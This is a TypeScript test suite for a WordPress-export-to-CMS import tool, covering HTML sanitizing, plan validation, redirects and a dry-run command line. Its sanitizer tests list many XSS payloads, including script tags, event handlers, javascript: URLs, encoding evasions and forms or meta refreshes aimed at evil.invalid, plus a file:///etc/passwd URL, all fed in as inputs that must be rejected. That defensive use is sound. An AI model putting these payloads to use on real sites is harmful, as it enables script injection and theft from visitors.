import { describe, expect, test } from 'bun:test';
import { spawnSync } from 'node:child_process';
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, realpathSync, rmSync, statSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { buildPlan, classifyZone, sourcePathOf, zonedToUtc } from '../tools/wp-import/map';
import { dryRunReport } from '../tools/wp-import/report';
import { canonicalJson, hashOf, planHash, resolveOldUrl, validatePlan, type Plan, type PlanDoc } from '../tools/wp-import/plan-schema';
import { convertBody, convertShortcodes, htmlToText, isSafeHtml, safeUrl, sanitizeHtml } from '../tools/wp-import/sanitize';
import { fixturePlan, fixtureXml } from '../tools/wp-import/write-fixture-plan';
import { noExtensions } from '../tools/wp-import/zip-hooks';
import { preflight } from '../tools/wxr-preflight';

const xml = readFileSync(fixtureXml, 'utf8');
const plan = buildPlan(xml);
const doc = (collection: string, wpId: number) => plan.docs.find(item => item.collection === collection && item.wpId === wpId)!;
const cli = (input: string, args: string[]) => spawnSync(process.execPath, [fileURLToPath(new URL('../tools/wp-import/import.ts', import.meta.url)), ...args], { input, encoding: 'utf8', timeout: 20_000 });

describe('sanitizer', () => {
  const attacks = [
    '<script>alert(1)</script>', '<SCRIPT SRC=//evil.invalid/x.js></SCRIPT>', '<scr<script>ipt>alert(1)</scr</script>ipt>', '<img src=x onerror=alert(1)>', '<img src="x" ONLOAD="a()">',
    '<a href="javascript:alert(1)">x</a>', '<a href="  JaVa\tScRiPt:alert(1)">x</a>', '<a href="jav&#x61;script:alert(1)">x</a>', '<a href="jav&#97;script&colon;alert(1)">x</a>', '<a href="data:text/html;base64,PHNjcmlwdD4=">x</a>',
    '<a href="vbscript:x">x</a>', '<a href="//evil.invalid/x">x</a>', '<img src="data:image/svg+xml;base64,AAAA">', '<iframe src="https://evil.invalid"></iframe>', '<object data="x"></object>', '<embed src="x">',
    '<svg onload=alert(1)><circle/></svg>', '<math><mi xlink:href="javascript:alert(1)">x</mi></math>', '<style>body{display:none}</style>', '<form action="https://evil.invalid"><input name="a"></form>',
    '<link rel="stylesheet" href="https://evil.invalid/x.css">', '<meta http-equiv="refresh" content="0;url=https://evil.invalid">', '<base href="https://evil.invalid/">', '<!-- <script>alert(1)</script> -->',
    '<![CDATA[<script>alert(1)</script>]]>', '<p style="background:url(javascript:alert(1))">x</p>', '<div onmouseover="x()">hover</div>', '<a href="https://example.invalid/" onclick="x()">x</a>',
    '<a href="https://user:pass@example.invalid/">x</a>', '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>', '<textarea><script>alert(1)</script></textarea>',
    '<p>unterminated <a href="javascript:alert(1)', '<<script>script>alert(1)<</script>/script>', '<img src="https://ok.invalid/x.png" alt="x" srcset="javascript:alert(1)">',
  ];
  test('every active-content attack is stripped: the output carries no executable markup', () => {
    for (const attack of attacks) {
      const { html } = sanitizeHtml(attack);
      expect(html).not.toMatch(/<\s*(?:script|iframe|object|embed|svg|math|style|form|input|link|meta|base|noscript|textarea)\b/i);
      expect(html).not.toMatch(/\bon[a-z]+\s*=/i);
      // Escaped text such as `&lt;a href="javascript:...` is inert; only real attributes matter.
      expect(html).not.toMatch(/<[^>]*\b(?:href|src)="\s*(?:java|vb)script:/i);
      expect(html).not.toMatch(/<[^>]*\b(?:href|src)="\s*data:/i);
      expect(html).not.toMatch(/href="\/\//);
      expect(isSafeHtml(html)).toBe(true);
    }
  });
  test('output is a fixed point and passes isSafeHtml, including for arbitrary byte soup', () => {
    let seed = 12345;
    const next = () => (seed = (seed * 1103515245 + 12345) & 0x7fffffff) / 0x7fffffff;
    const alphabet = ['<', '>', '/', '"', "'", '=', ' ', 'a', 'p', 'script', 'img', 'onerror', 'href', 'javascript:', '&#106;', '&lt;', '\n', '<!--', '-->', '<![CDATA[', ']]>', 'x'];
    for (let i = 0; i < 400; i++) {
      const input = Array.from({ length: 1 + Math.floor(next() * 40) }, () => alphabet[Math.floor(next() * alphabet.length)]).join('');
      const once = sanitizeHtml(input).html;
      expect(sanitizeHtml(once).html).toBe(once);
      expect(isSafeHtml(once)).toBe(true);
      expect(once).not.toMatch(/<\s*(?:script|iframe|object|embed|svg|style|form)\b/i);
    }
    for (const attack of attacks) expect(isSafeHtml(sanitizeHtml(attack).html)).toBe(true);
  });
  test('unsafe sources are flagged unsafe; benign formatting is kept and safe', () => {
    expect(sanitizeHtml('<p onclick="x()">a</p>').unsafe).toBe(true);
    expect(sanitizeHtml('<iframe src="https://example.invalid"></iframe>').unsafe).toBe(true);
    const good = sanitizeHtml('<h1>Title</h1><p>One <b>two</b> <i>three</i> <a href="https://example.invalid/a?b=1&c=2" target="_blank">link</a></p><ul><li>a</li></ul><img src="/wp-content/uploads/x.png" alt="x" width="10" height="20">');
    expect(good.unsafe).toBe(false);
    expect(good.html).toBe('<h2>Title</h2><p>One <strong>two</strong> <em>three</em> <a href="https://example.invalid/a?b=1&amp;c=2" rel="noopener noreferrer">link</a></p><ul><li>a</li></ul><img src="/wp-content/uploads/x.png" alt="x" width="10" height="20">');
    expect(isSafeHtml('<p onclick="x()">a</p>')).toBe(false);
    expect(isSafeHtml('<p>fine</p>')).toBe(true);
  });
  test('URL policy: http(s) and mailto/tel links, relative paths, nothing protocol-relative or credentialed', () => {
    expect(safeUrl('https://example.invalid/a', 'link')).toBe('https://example.invalid/a');
    expect(safeUrl('mailto:someone@example.invalid', 'link')).toBe('mailto:someone@example.invalid');
    expect(safeUrl('mailto:someone@example.invalid', 'img')).toBeNull();
    for (const bad of ['javascript:x', 'data:text/html,x', '//evil.invalid', 'https://u:p@example.invalid/', 'file:///etc/passwd', '', '/\\evil.invalid', '\\\\evil.invalid', '/ok\\x']) expect(safeUrl(bad, 'link')).toBeNull();
    expect(sanitizeHtml('<a href="/\\evil.invalid">x</a><img src="/\\evil.invalid/x.png">').html).not.toContain('evil');
  });
  test('adversarial size and shape cannot make the scan quadratic or oversize', () => {
    const started = performance.now();
    const unterminated = sanitizeHtml("<a '".repeat(100_000));
    const pairs = sanitizeHtml('<script></script>'.repeat(50_000));
    expect(isSafeHtml(unterminated.html)).toBe(true);
    expect(pairs.html).toBe('');
    // A generous wall-clock ceiling only guards against quadratic blow-up, not normal timing variance.
    expect(performance.now() - started).toBeLessThan(15_000);
    expect(sanitizeHtml('x'.repeat(1024 * 1024 + 1))).toMatchObject({ html: '', unsafe: true, findings: { oversize: 1 } });
  });
  test('Divi/Gravity/plugin shortcodes are converted or stripped; builder code modules are dropped whole', () => {
    const body = '[et_pb_section][et_pb_text]<p>Hello</p>[/et_pb_text][et_pb_code]<script>x()</script>[/et_pb_code][et_pb_button button_url="https://example.invalid/" button_text="Go"][gravityform id="2"][tribe_events view="list"][caption id="a"]<img src="/a.png" alt="a"> cap[/caption] [sic][/et_pb_section]';
    const converted = convertShortcodes(body);
    expect(converted.text).not.toContain('et_pb');
    expect(converted.text).not.toContain('<script');
    expect(converted.text).toContain('[sic]');
    expect(converted.findings).toMatchObject({ 'builder-code': 1, 'form-shortcode-dropped': 1, 'plugin-shortcode-dropped': 1 });
    const result = convertBody(body);
    expect(result.unsafe).toBe(true);
    expect(result.html).toContain('<a href="https://example.invalid/" rel="noopener noreferrer">Go</a>');
    expect(isSafeHtml(result.html)).toBe(true);
    expect(htmlToText('<p>A &amp; B</p><p>C<br>D</p>')).toBe('A & B\nC\nD');
  });
});

describe('mapping the synthetic export', () => {
  test('is deterministic, sealed and passes the shared validator', () => {
    expect(buildPlan(xml)).toEqual(plan);
    expect(planHash((({ planSha256: _, ...rest }) => rest)(plan))).toBe(plan.planSha256);
    expect(validatePlan(JSON.parse(JSON.stringify(plan)))).toEqual(plan);
    expect(plan.policy).toMatchObject({ mediaBytes: 'not-downloaded-references-only', gravityEntries: 'excluded', defaultStatus: 'draft', networkFetches: 0 });
  });
  test('the committed CMS fixture plan matches a fresh build (regenerate with write-fixture-plan.ts)', () => {
    expect(JSON.parse(readFileSync(fixturePlan, 'utf8'))).toEqual(JSON.parse(JSON.stringify(plan)));
  });
  test('every source record is accounted for: mapped to a document or listed as unmapped with a reason', () => {
    const mapped = new Set(plan.docs.map(item => item.ordinal));
    const unmappedRecords = new Set(plan.unmapped.filter(item => item.scope === 'record').map(item => item.ordinal));
    expect(plan.summary.sourceItems).toBe(43);
    expect(mapped.size + unmappedRecords.size).toBe(43);
    for (const ordinal of mapped) expect(unmappedRecords.has(ordinal)).toBe(false);
    expect(plan.unmapped.every(item => /^[a-z0-9-]+$/.test(item.reason))).toBe(true);
    const reasons = (plan.summary.unmappedByReason as Record<string, number>);
    expect(reasons).toMatchObject({ 'record:trashed': 1, 'record:auto-draft': 1, 'record:revision': 1, 'record:invalid-or-duplicate-id': 3, 'record:event-missing-or-unconvertible-start': 1, 'record:attachment-url-missing-or-unsafe': 1, 'record:non-content-status': 1 });
    expect(plan.summary.mappedByCollection).toEqual({ events: 5, initiatives: 1, media: 6, newsletters: 1, pages: 6, posts: 10 });
  });
  test('posts: a newsletter needs both a name and PDF evidence; everything else is a post, never guessed', () => {
    expect(doc('newsletters', 2001).refs).toEqual({ issuePdf: 3002, coverImage: 3001 });
    expect(doc('newsletters', 2001).data.issueDate).toBe('2024-10-01T13:00:00.000Z');
    expect(doc('posts', 2002).flags).toContain('newsletter-without-pdf-evidence');
    expect(plan.docs.some(item => item.collection === 'newsletters' && item.wpId === 2002)).toBe(false);
  });
  test('statuses: drafts, pending, private, future and password-protected stay drafts; trash, revision and auto-draft are not imported', () => {
    for (const [collection, id] of [['posts', 2005], ['posts', 2006], ['posts', 2007], ['posts', 2008], ['pages', 1003], ['pages', 1004]] as const) {
      expect(doc(collection, id)).toMatchObject({ desiredStatus: 'draft', publishEligible: false });
    }
    expect(doc('pages', 1004).data.wpPasswordProtected).toBe(true);
    expect(JSON.stringify(plan)).not.toContain('fixture-password-value');
    for (const id of [2009, 2010, 2011]) expect(plan.docs.some(item => item.wpId === id)).toBe(false);
    expect(doc('pages', 1001).desiredStatus).toBe('published');
    expect(doc('media', 3001).desiredStatus).toBe('inherit');
    expect(plan.docs.filter(item => item.collection === 'media').every(item => item.data.public === false)).toBe(true);
  });
  test('slugs are unique per collection and duplicates are suffixed deterministically', () => {
    expect(doc('posts', 2003).data.slug).toBe('club-story');
    expect(doc('posts', 2004).data.slug).toBe('club-story-2004');
    expect(doc('posts', 2004).flags).toContain('slug-deduplicated');
    for (const collection of ['posts', 'pages', 'events']) {
      const slugs = plan.docs.filter(item => item.collection === collection).map(item => item.data.slug);
      expect(new Set(slugs).size).toBe(slugs.length);
    }
  });
  test('attachments become references only: URL, alt, mime, dimensions; orphans and odd files are flagged', () => {
    expect(doc('media', 3001).data).toMatchObject({ sourceUrl: 'https://princetonterraceclub.org/wp-content/uploads/2024/03/fall-cover.jpg', alt: 'Fall issue cover', mimeType: 'image/jpeg', width: 800, height: 600, caption: 'Cover caption', public: false });
    expect(doc('media', 3002).data.mimeType).toBe('application/pdf');
    expect(doc('media', 3004).flags).toContain('attachment-without-parent');
    expect(doc('media', 3007).flags).toContain('mime-unknown');
    expect(plan.docs.some(item => item.wpId === 3005 || item.wpId === 3008)).toBe(false);
    expect(plan.docs.filter(item => item.collection === 'media').every(item => !('filename' in item.data) && !('url' in item.data))).toBe(true);
  });
  test('unsafe and builder bodies are stripped, flagged and never eligible for publication', () => {
    const story = doc('posts', 2003), dues = doc('pages', 1002);
    expect(String(story.data.bodyHtml)).not.toMatch(/script|iframe|onerror|onclick|javascript:/i);
    expect(story.flags).toContain('unsafe-html-stripped');
    expect(dues.flags).toEqual(expect.arrayContaining(['builder-code-dropped', 'divi-layout-review', 'form-shortcode-dropped']));
    for (const item of [story, dues]) expect(item).toMatchObject({ desiredStatus: 'draft', publishEligible: false });
    for (const item of plan.docs) if (typeof item.data.bodyHtml === 'string') expect(isSafeHtml(item.data.bodyHtml)).toBe(true);
  });
  test('events: UTC pair is the instant, zones are preserved, fixed offsets and missing venues need review, no guessed dates', () => {
    expect(doc('events', 4001).data).toMatchObject({ startsAt: '2030-01-19T00:00:00.000Z', endsAt: '2030-01-19T03:00:00.000Z', timezone: 'America/New_York', startsAtLocal: '2030-01-18 19:00:00', locationName: 'Fixture Hall', organizerName: 'Fixture Committee', category: 'music' });
    expect(doc('events', 4001).refs).toEqual({ coverImage: 3006 });
    expect(doc('events', 4002).flags).toContain('event-timezone-review');
    expect(doc('events', 4002)).toMatchObject({ desiredStatus: 'draft' });
    expect(doc('events', 4005).data.allDay).toBe(true);
    expect(doc('events', 4005)).toMatchObject({ desiredStatus: 'published', publishEligible: true });
    expect(doc('events', 4006).data.endsAt).toBeUndefined();
    expect(doc('events', 4006)).toMatchObject({ desiredStatus: 'draft' });
    // Local-only dates are converted through the recognized zone and still flagged; no zone or no dates means no event.
    expect(doc('events', 4004).data.startsAt).toBe('2030-07-04T16:00:00.000Z');
    expect(doc('events', 4004).flags).toEqual(expect.arrayContaining(['event-date-review', 'event-venue-missing']));
    expect(doc('events', 4004).data.locationName).toBe('Location to be confirmed');
    expect(plan.docs.some(item => item.wpId === 4003)).toBe(false);
  });
  test('timezone arithmetic respects daylight saving and fixed offsets', () => {
    expect(new Date(zonedToUtc({ y: 2030, m: 1, d: 18, h: 19, i: 0, s: 0 }, 'America/New_York')).toISOString()).toBe('2030-01-19T00:00:00.000Z');
    expect(new Date(zonedToUtc({ y: 2030, m: 7, d: 4, h: 12, i: 0, s: 0 }, 'America/New_York')).toISOString()).toBe('2030-07-04T16:00:00.000Z');
    expect(classifyZone('UTC-4')).toEqual({ kind: 'fixed', minutes: -240 });
    expect(classifyZone('UTC+5:30')).toEqual({ kind: 'fixed', minutes: 330 });
    expect(classifyZone('Not/AZone').kind).toBe('unknown');
    expect(classifyZone('').kind).toBe('missing');
  });
  test('publish-status counts reproduce the preflight on the same input', () => {
    const check = preflight(xml);
    expect(plan.summary.sourceItems).toBe(check.itemCount);
    expect(plan.summary.publishStatusContentWithoutPassword).toBe(check.scope.publishStatusContentWithoutPassword);
  });
});

const reseal = (changes: Partial<Plan>): Plan => {
  const { planSha256: _, ...rest } = { ...plan, ...changes };
  return { ...rest, planSha256: planHash(rest) };
};
const withDoc = (wpId: number, collection: string, change: (item: PlanDoc) => PlanDoc) => reseal({ docs: plan.docs.map(item => item.wpId === wpId && item.collection === collection ? change(item) : item) });

describe('plan validation derives publication from source facts', () => {
  test('a re-sealed plan cannot publish a draft, a protected item, a flagged item or media', () => {
    const draft = (item: PlanDoc) => ({ ...item, desiredStatus: 'published' as const, publishEligible: true });
    expect(() => validatePlan(withDoc(1003, 'pages', draft))).toThrow('publication not supported by source');
    expect(() => validatePlan(withDoc(1003, 'pages', item => ({ ...draft(item), sourceStatus: 'publish' })))).toThrow('status mismatch');
    expect(() => validatePlan(withDoc(1004, 'pages', draft))).toThrow('publication not supported by source');
    expect(() => validatePlan(withDoc(2003, 'posts', draft))).toThrow('publication not supported by source');
    expect(() => validatePlan(withDoc(1001, 'pages', item => ({ ...item, flags: ['unsafe-html-stripped'], data: { ...item.data, wpReviewFlags: ['unsafe-html-stripped'] }, targetHash: hashOf({ data: { ...item.data, wpReviewFlags: ['unsafe-html-stripped'] }, refs: item.refs }) })))).toThrow('publication not supported by source');
    expect(() => validatePlan(withDoc(1001, 'pages', item => ({ ...item, flags: [] , sourceStatus: 'draft', data: { ...item.data, wpStatus: 'draft' }, targetHash: hashOf({ data: { ...item.data, wpStatus: 'draft' }, refs: item.refs }) })))).toThrow('publication not supported by source');
    expect(() => validatePlan(withDoc(1001, 'pages', item => ({ ...item, flags: ['divi-layout-review'] })))).toThrow('review flags mismatch');
    expect(validatePlan(JSON.parse(JSON.stringify(plan))).docs.length).toBe(plan.docs.length);
  });
  test('malformed documents fail validation instead of throwing a type error; strict field types', () => {
    expect(() => validatePlan(reseal({ docs: plan.docs.map((item, i) => i === 0 ? { ...item, data: null as never } : item) }))).toThrow('Invalid import plan');
    for (const [field, value] of [['menuOrder', 'x'], ['menuOrder', 1.5], ['startsAtLocal', 'tomorrow']] as const) {
      expect(() => validatePlan(withDoc(1001, 'pages', item => ({ ...item, data: { ...item.data, [field]: value } })))).toThrow('Invalid import plan');
    }
    expect(() => validatePlan(withDoc(4001, 'events', item => { const data = { ...item.data, category: 'party' }; return { ...item, data, targetHash: hashOf({ data, refs: item.refs }) }; }))).toThrow('category');
  });
  test('redirect destinations are re-derived: external, mismatched, reserved and self redirects are rejected', () => {
    const swap = (change: Partial<Plan['redirects'][number]>, index = plan.redirects.findIndex(item => item.mode === 'redirect')) =>
      reseal({ redirects: plan.redirects.map((item, i) => i === index ? { ...item, ...change } : item) });
    expect(() => validatePlan(swap({ destination: 'https://evil.invalid/' }))).toThrow('redirect');
    expect(() => validatePlan(swap({ destination: '/pages/other' }))).toThrow('redirect destination');
    expect(() => validatePlan(swap({ sourcePath: '/members/area' }))).toThrow('redirect destination');
    expect(() => validatePlan(swap({ sourcePath: '/about' }))).toThrow('redirect destination');
    const inPlace = plan.redirects.findIndex(item => item.mode === 'served-in-place');
    expect(() => validatePlan(swap({ destination: '/pages/about' }, inPlace))).toThrow('redirect destination');
    expect(() => validatePlan(swap({ collection: 'posts' }, inPlace))).toThrow('redirect');
  });
  test('reserved and self-referential sources are listed as gaps by the planner, not mapped', () => {
    const reserved = buildPlan(xml.replace('https://princetonterraceclub.org/2024/04/club-story/', 'https://princetonterraceclub.org/members/club-story/').replace('https://princetonterraceclub.org/project/fixture-initiative/', 'https://princetonterraceclub.org/initiatives/'));
    expect(reserved.unmapped.filter(item => item.scope === 'redirect').map(item => item.reason)).toEqual(expect.arrayContaining(['redirect-reserved-route']));
    expect(reserved.redirects.some(item => item.sourcePath.startsWith('/members/'))).toBe(false);
    expect(() => validatePlan(JSON.parse(JSON.stringify(reserved)))).not.toThrow();
  });
});

describe('redirect map', () => {
  const published = plan.docs.filter(item => item.collection !== 'media' && item.sourceStatus === 'publish' && item.data.wpPasswordProtected !== true);
  test('every published, unprotected document has a redirect or an explicit reason it cannot', () => {
    const gaps = new Set(plan.unmapped.filter(item => item.scope === 'redirect').map(item => item.ordinal));
    for (const item of published) expect(plan.redirects.some(entry => entry.wpId === item.wpId) || gaps.has(item.ordinal)).toBe(true);
    expect(plan.redirects.length + gaps.size).toBe(published.length);
    expect(plan.unmapped.filter(item => item.scope === 'redirect').map(item => item.reason).sort()).toEqual(['redirect-foreign-origin', 'redirect-query-or-fragment-route', 'redirect-unrepresentable-path']);
  });
  test('every mapped old URL resolves to a real new path, with and without trailing slash and on the www host', () => {
    expect(plan.redirects.length).toBe(13);
    for (const entry of plan.redirects) {
      const target = plan.docs.find(item => item.collection === entry.collection && item.wpId === entry.wpId)!;
      for (const old of [`https://princetonterraceclub.org${entry.sourcePath}/`, `https://www.princetonterraceclub.org${entry.sourcePath}`, entry.sourcePath]) {
        const resolved = resolveOldUrl(plan, old);
        expect(resolved).not.toBeNull();
        expect(resolved!.destination).toBe(entry.destination);
        if (entry.mode === 'redirect') expect(entry.destination).toBe({ events: '/events/', newsletters: '/newsletter/', posts: '/news/', pages: '/pages/', initiatives: '/initiatives' }[entry.collection] + (entry.collection === 'initiatives' ? '' : String(target.data.slug)));
      }
    }
    expect(resolveOldUrl(plan, 'https://princetonterraceclub.org/about/')).toEqual({ destination: '/about', mode: 'served-in-place' });
    expect(resolveOldUrl(plan, 'https://princetonterraceclub.org/?p=2012')).toBeNull();
    expect(resolveOldUrl(plan, 'https://princetonterraceclub.org/membership/dues/?utm=x')).toBeNull();
    expect(resolveOldUrl(plan, 'https://princetonterraceclub.org/never-existed/')).toBeNull();
  });
  test('sources are unique, representable, and never come from drafts, private or protected items', () => {
    expect(new Set(plan.redirects.map(item => item.sourcePath)).size).toBe(plan.redirects.length);
    for (const entry of plan.redirects) {
      expect(entry.sourcePath).toMatch(/^\/(?!\/)[a-zA-Z0-9/_-]*$/);
      expect(plan.docs.find(item => item.collection === entry.collection && item.wpId === entry.wpId)).toMatchObject({ sourceStatus: 'publish' });
    }
    expect(plan.redirects.some(item => [1003, 1004, 2005, 2006, 2007, 2008].includes(item.wpId))).toBe(false);
  });
  test('source path parsing rejects queries, foreign hosts, credentials and unsafe characters', () => {
    const hosts = new Set(['princetonterraceclub.org']);
    expect(sourcePathOf('https://princetonterraceclub.org/a/b/', hosts)).toEqual({ path: '/a/b' });
    for (const [link, reason] of [['https://princetonterraceclub.org/?p=1', 'query-or-fragment-route'], ['https://other.invalid/a', 'foreign-origin'], ['https://u:p@princetonterraceclub.org/a', 'no-valid-source-url'], ['https://princetonterraceclub.org/a.html', 'unrepresentable-path'], ['https://princetonterraceclub.org/', 'site-root'], ['not a url', 'no-valid-source-url']]) {
      expect(sourcePathOf(link, hosts)).toEqual({ reason });
    }
  });
});

describe('reconciliation report', () => {
  const report = dryRunReport(plan, xml);
  const text = JSON.stringify(report);
  test('carries counts, hashes and reason codes, but no content, names, emails, GUIDs or WordPress IDs', () => {
    for (const secret of ['Fixture Open Mic', 'Fixture Author', 'example.invalid', 'fixture_author', 'Fall issue cover', 'wp-content', '?p=', 'fixture-password-value', 'princetonterraceclub.org']) expect(text).not.toContain(secret);
    expect(report.writes).toEqual({ cms: 0, files: 0, network: 0, redirects: 0 });
    expect(report.preflightReproduction.itemCount.equal).toBe(true);
    expect(report.preflightReproduction.publishStatusContentWithoutPassword.equal).toBe(true);
    expect(report.documents.length).toBe(plan.docs.length);
    expect(report.documents.every(item => /^[0-9a-f]{64}$/.test(item.sourceHash) && /^[0-9a-f]{64}$/.test(item.targetHash))).toBe(true);
    expect((report.counts.bySourceType as Record<string, Record<string, number>>).post).toMatchObject({ total: 15, publish: 9 });
    expect(report.unmapped.length).toBe(plan.unmapped.length);
    expect(report.deferredToKinstaZip).toEqual({ mediaBytes: 'todo-kinsta-zip', menus: 'todo-kinsta-zip', pluginSettings: 'todo-kinsta-zip' });
    expect(report.redirects.length).toBe(plan.redirects.length);
  });
  test('content hashes change when the source changes and are stable otherwise', () => {
    const changed = buildPlan(xml.replace('An invented open mic.', 'An invented open mic, revised.'));
    expect(changed.docs.find(item => item.wpId === 4001)!.sourceHash).not.toBe(doc('events', 4001).sourceHash);
    expect(changed.docs.find(item => item.wpId === 4001)!.targetHash).not.toBe(doc('events', 4001).targetHash);
    expect(changed.docs.find(item => item.wpId === 4002)!.targetHash).toBe(doc('events', 4002).targetHash);
    expect(hashOf({ b: 1, a: [2, { d: 1, c: 2 }] })).toBe(hashOf(JSON.parse('{"a":[2,{"c":2,"d":1}],"b":1}')));
    expect(canonicalJson({ b: undefined, a: 1 })).toBe('{"a":1}');
  });
  test('the Kinsta ZIP hooks are declared but unimplemented', () => {
    expect(noExtensions.media).toBeNull();
    expect(noExtensions.database).toBeNull();
  });
});

describe('command line', () => {
  const withDirectory = (run: (directory: string) => void) => {
    const directory = mkdtempSync(join(realpathSync(tmpdir()), 'wp-import-'));
    try { chmodSync(directory, 0o700); run(directory); } finally { rmSync(directory, { recursive: true, force: true }); }
  };
  test('dry-run writes exactly one 0600 safe report, prints only aggregates and makes no network request', async () => {
    let requests = 0;
    const server = Bun.serve({ hostname: '127.0.0.1', port: 0, fetch: () => { requests++; return new Response('x'); } });
    try {
      const hostile = xml.replace('An invented open mic.', `&lt;img src="http://127.0.0.1:${server.port}/x"&gt;`);
      withDirectory(directory => {
        const report = join(directory, 'dryrun.safe.json');
        const run = cli(hostile, ['dry-run', '--report', report]);
        expect(run.status).toBe(0);
        expect(run.stderr).toBe('');
        expect(readdirSync(directory)).toEqual(['dryrun.safe.json']);
        expect(statSync(report).mode & 0o777).toBe(0o600);
        const summary = JSON.parse(run.stdout);
        expect(summary).toMatchObject({ mode: 'dry-run', mappedDocuments: 29, unmappedRecords: 14, redirectGaps: 3, reportWritten: true, planWritten: false, writes: { cms: 0, files: 0, network: 0, redirects: 0 } });
        expect(summary.itemCount).toMatchObject({ import: 43, preflight: 43, equal: true });
        for (const secret of ['Fixture', 'example.invalid', 'princetonterraceclub', 'fixture_author']) { expect(run.stdout).not.toContain(secret); expect(readFileSync(report, 'utf8')).not.toContain(secret); }
        expect(JSON.parse(readFileSync(report, 'utf8')).kind).toBe('wp-import-dry-run-report');
        expect(cli(hostile, ['dry-run', '--report', report]).status).toBe(1); // never overwrites
      });
      await Bun.sleep(20);
      expect(requests).toBe(0);
    } finally { server.stop(true); }
  });
  test('plan writes a private plan that validates and a report; refuses unsafe destinations with fixed text', () => {
    withDirectory(directory => {
      const out = join(directory, 'plan.json');
      const run = cli(xml, ['plan', '--out', out, '--report', join(directory, 'report.json')]);
      expect(run.status).toBe(0);
      expect(statSync(out).mode & 0o777).toBe(0o600);
      expect(validatePlan(JSON.parse(readFileSync(out, 'utf8'))).planSha256).toBe(plan.planSha256);
      const checkout = join(directory, 'checkout'); mkdirSync(checkout, { mode: 0o700 }); mkdirSync(join(checkout, '.git'));
      const open = join(directory, 'open'); mkdirSync(open, { mode: 0o755 }); chmodSync(open, 0o755);
      for (const destination of ['relative.json', join(checkout, 'x.json'), join(open, 'x.json'), join(directory, 'missing', 'x.json')]) {
        const rejected = cli(xml, ['plan', '--out', destination]);
        expect(rejected.status).toBe(1);
        expect(rejected.stdout).toBe('');
        expect(rejected.stderr).toContain('Nothing was written to the CMS.');
        expect(rejected.stderr).not.toContain(destination);
      }
      expect(existsSync(join(checkout, 'x.json'))).toBe(false);
    });
  });
  test('malformed, unsafe or mis-invoked input fails with fixed text and no output', () => {
    withDirectory(directory => {
      const report = join(directory, 'r.json');
      for (const input of ['<rss>', `<!DOCTYPE rss [<!ENTITY a "b">]>${xml}`, xml.replace('<wp:wxr_version>1.2</wp:wxr_version>', '')]) {
        const run = cli(input, ['dry-run', '--report', report]);
        expect(run.status).toBe(1);
        expect(run.stdout).toBe('');
        expect(run.stderr).toContain('Import planning failed.');
      }
      expect(existsSync(report)).toBe(false);
      for (const args of [[], ['apply'], ['dry-run'], ['dry-run', '--report'], ['dry-run', '--report', report, '--out', report], ['plan', '--report', report]]) {
        const run = cli(xml, args);
        expect(run.status).toBe(1);
        expect(run.stdout).toBe('');
        expect(run.stderr).toContain('Usage');
      }
    });
  });
});
